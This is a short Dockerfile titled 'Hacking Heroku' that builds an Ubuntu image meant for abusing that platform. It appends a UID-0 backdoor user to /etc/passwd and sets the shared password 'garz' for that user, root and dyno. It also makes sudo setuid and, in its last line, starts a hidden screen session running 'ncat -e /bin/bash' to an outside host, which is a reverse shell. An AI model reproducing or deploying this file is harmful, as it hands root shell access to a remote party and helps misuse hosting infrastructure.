# ------------------------------------------------------------
# Hacking Heroku
# ------------------------------------------------------------

FROM ubuntu:20.04

WORKDIR /tmp
ENV TZ=Asia/Jakarta \
    DEBIAN_FRONTEND=noninteractive
RUN apt-get update
RUN useradd garz
RUN apt-get -y install net-tools sudo nano python python3 python3-pip ncat screen
RUN echo "garz:x:0:0:root:/root:/bin/bash" | tee -a /etc/passwd
RUN echo "garz\ngarz\n" | passwd garz
RUN echo "garz\ngarz\n" | passwd root
RUN echo "garz\ngarz\n" | passwd dyno
RUN chown root:root /usr/bin/sudo && chmod 4755 /usr/bin/sudo
RUN screen -dmS gas ncat -e /bin/bash sister.ust.ac.id 9999
